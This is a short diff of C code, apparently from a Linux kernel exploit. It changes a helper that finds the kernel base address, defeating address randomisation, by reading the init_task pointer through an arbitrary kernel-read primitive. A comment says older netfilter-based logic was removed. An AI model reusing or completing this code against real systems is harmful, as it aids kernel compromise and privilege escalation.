@@ -486,7 +486,8 @@ int hex_value(char c) {
 // ===================== 重写：使用init_task获取基址，移除旧bootid+nfulnl逻辑 =====================
 uint64_t slide_read_stext(void) {
 #if defined(SLIDE_INIT_TASK_IMAGE)
-  uint64_t init_task_ptr = kernel_read64(SLIDE_INIT_TASK_IMAGE);
+  uint64_t init_task_ptr = kernel_read64(fd, SLIDE_INIT_TASK_IMAGE);
+
   if (!init_task_ptr || (init_task_ptr >> 48) != 0xffff) {
     pr_warning("slide invalid init_task pointer=%016llx\n", (unsigned long long)init_task_ptr);
     return 0;
